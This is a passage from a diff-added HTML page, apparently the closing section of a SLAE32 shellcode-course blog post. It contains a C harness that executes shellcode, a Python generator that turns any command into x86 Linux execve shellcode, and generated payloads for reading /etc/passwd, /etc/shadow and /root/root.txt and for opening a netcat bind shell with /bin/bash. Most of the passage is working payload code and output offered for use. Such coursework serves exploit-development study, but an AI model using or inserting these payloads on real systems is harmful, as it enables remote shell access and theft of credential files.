+        &quot;\xb0\x0b\xcd\x80&quot;;
+
+main()
+{
+
+	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+</code></pre><p>user@local:$ <code>gcc shellcode.c -o shellcode -z execstack</code></p>
+<p>Now we open a new listener:</p>
+<p>root@local:# <code>nc -lvp 443</code></p>
+<p>and run in another terminal the PoC:</p>
+<p>user@local:$ <code>./shellcode</code></p>
+<p>And enjoy!</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>TCP Bindshell and Reverse Shell principles are quite similar if you except to do it using the standard way (through socket programming).</p>
+<p>Since doing repetitive things is boring, we studied a good alternative only using the <code>execve()</code> syscall.</p>
+<p>We could modify few things in our python shellcode generator and create a variant to generate this time shellcodes to run any commands.</p>
+<p>By chance, we did it!</p>
+<h2 id="bonus---command-shellcode-generator-python3">Bonus - Command Shellcode Generator (Python3)</h2>
+<pre><code>#!/usr/bin/python3
+
+'''
+	Jean-Pierre LESUEUR
+	@DarkCoderSc
+
+	jplesueur@phrozen.io
+	https://www.phrozen.io
+'''
+
+import sys
+from textwrap import wrap
+
+def fail(message):
+    print(&quot;[\033[31mKO\033[39m] &quot; + message)
+
+def success(message):
+    print(&quot;[\033[32mOK\033[39m] &quot; + message)
+	
+if len(sys.argv) != 2:
+	print(&quot;Usage: ./gen_cmd_shellcode.py &lt;command&gt;&quot;)
+
+	sys.exit()
+
+command = sys.argv[1]
+
+payload = &quot;&quot;
+
+payload += &quot;\\x31\\xc0&quot;                 # xor eax, eax
+payload += &quot;\\x50&quot;                      # push eax
+payload += &quot;\\x68\\x62\\x61\\x73\\x68&quot;  # push   0x68736162
+payload += &quot;\\x68\\x69\\x6e\\x2f\\x2f&quot;  # push   0x2f2f6e69
+payload += &quot;\\x68\\x2f\\x2f\\x2f\\x62&quot;  # push   0x622f2f2f
+payload += &quot;\\x89\\xe3&quot;                 # mov    ebx,esp
+payload += &quot;\\x66\\xb8\\x2d\\x63&quot;       # mov    ax,0x632d
+payload += &quot;\\x50&quot;                      # push   eax
+payload += &quot;\\x31\\xc0&quot;                 # xor    eax,eax
+payload += &quot;\\x89\\xe2&quot;                 # mov    edx,esp
+payload += &quot;\\x50&quot;                      # push   eax
+#########################################
+
+'''
+	Align command following chosen options
+'''
+pad = 4 - (len(command) % 4)
+
+if (pad &lt; 4):
+	command = (&quot;/&quot;*pad) + command
+
+'''
+	Write our reverse shell command (Aligned)
+'''
+
+for i in reversed(range(0, len(command), 4)):
+	opcode = &quot;\\x68&quot;
+	for n in range(4):
+		opcode += &quot;\\x&quot; + command[i:(i+4)][n:(n+1)].encode('ascii').hex()
+		
+
+	payload += opcode
+
+#########################################
+payload += &quot;\\x89\\xe6&quot;                 # mov    esi,esp
+payload += &quot;\\x50&quot;                      # push   eax
+payload += &quot;\\x56&quot;                      # push   esi
+payload += &quot;\\x52&quot;                      # push   edx
+payload += &quot;\\x53&quot;                      # push   ebx
+payload += &quot;\\x89\\xe1&quot;                 # mov    ecx,esp
+payload += &quot;\\x50&quot;                      # push   eax
+payload += &quot;\\x89\\xe2&quot;                 # mov    edx,esp
+payload += &quot;\\xb0\\x0b&quot;                 # mov    al,0xb
+payload += &quot;\\xcd\\x80&quot;                 # int    0x80
+
+size = int(len(payload) / 4)
+success(&quot;Shellcode successfully generated, size={} Bytes.&quot;.format(size))
+
+final_payload = &quot;// Shellcode size = {}\n&quot;.format(size)
+final_payload += &quot;unsigned char code[] = \\\n&quot;
+
+for l in wrap(payload, 64):
+	final_payload += &quot;\t\&quot;{}\&quot;\n&quot;.format(l)
+
+final_payload = final_payload[:-1] + &quot;;&quot;
+
+print(final_payload)
+</code></pre><h3 id="few-examples">Few examples</h3>
+<p>user@local:$ <code>./gen_cmd_shellcode.py &quot;/bin/cat /etc/passwd&quot;</code></p>
+<pre><code>// Shellcode size = 70
+unsigned char code[] = \
+    &quot;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f&quot;
+    &quot;\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x73&quot;
+    &quot;\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x20\x2f\x65\x74\x68\x2f\x63&quot;
+    &quot;\x61\x74\x68\x2f\x62\x69\x6e\x89\xe6\x50\x56\x52\x53\x89\xe1\x50&quot;
+    &quot;\x89\xe2\xb0\x0b\xcd\x80&quot;;
+</code></pre><p>user@local:$ <code>./gen_cmd_shellcode.py &quot;/bin/cat /etc/shadow&quot;</code></p>
+<pre><code>// Shellcode size = 70
+unsigned char code[] = \
+    &quot;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f&quot;
+    &quot;\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x61&quot;
+    &quot;\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x20\x2f\x65\x74\x68\x2f\x63&quot;
+    &quot;\x61\x74\x68\x2f\x62\x69\x6e\x89\xe6\x50\x56\x52\x53\x89\xe1\x50&quot;
+    &quot;\x89\xe2\xb0\x0b\xcd\x80&quot;;
+</code></pre><p>user@local:$ <code>./gen_cmd_shellcode.py &quot;/bin/ip a &amp;&amp; /bin/uname -r&quot;</code></p>
+<pre><code>// Shellcode size = 80
+unsigned char code[] = \
+    &quot;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f&quot;
+    &quot;\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x65&quot;
+    &quot;\x20\x2d\x72\x68\x75\x6e\x61\x6d\x68\x62\x69\x6e\x2f\x68\x26\x26&quot;
+    &quot;\x20\x2f\x68\x70\x20\x61\x20\x68\x69\x6e\x2f\x69\x68\x2f\x2f\x2f&quot;
+    &quot;\x62\x89\xe6\x50\x56\x52\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80&quot;;
+</code></pre><p>user@local:$ <code>./gen_cmd_shellcode.py &quot;/bin/nc -lvp 443 -e /bin/bash&quot;</code></p>
+<pre><code>// Shellcode size = 85
+unsigned char code[] = \
+    &quot;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f&quot;
+    &quot;\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x62&quot;
+    &quot;\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2d\x65\x20\x2f\x68\x34\x34&quot;
+    &quot;\x33\x20\x68\x6c\x76\x70\x20\x68\x6e\x63\x20\x2d\x68\x62\x69\x6e&quot;
+    &quot;\x2f\x68\x2f\x2f\x2f\x2f\x89\xe6\x50\x56\x52\x53\x89\xe1\x50\x89&quot;
+    &quot;\xe2\xb0\x0b\xcd\x80&quot;;
+</code></pre><p>user@local:$ <code>./gen_cmd_shellcode.py &quot;/bin/cat /root/root.txt&quot;</code></p>
+<pre><code>// Shellcode size = 75
+unsigned char code[] = \
+    &quot;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f&quot;
+    &quot;\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x2e&quot;
+    &quot;\x74\x78\x74\x68\x72\x6f\x6f\x74\x68\x6f\x6f\x74\x2f\x68\x74\x20&quot;
+    &quot;\x2f\x72\x68\x6e\x2f\x63\x61\x68\x2f\x2f\x62\x69\x89\xe6\x50\x56&quot;
+    &quot;\x52\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80&quot;;
+</code></pre><h1 id="afterword">Afterword</h1>
+<p>You may find a copy of all codes in the following repository : <a href="https://github.com/DarkCoderSc/slae32-reverse-shell">https://github.com/DarkCoderSc/slae32-reverse-shell</a></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex justify-between">
+
+
+
+
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "phrozen-1" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
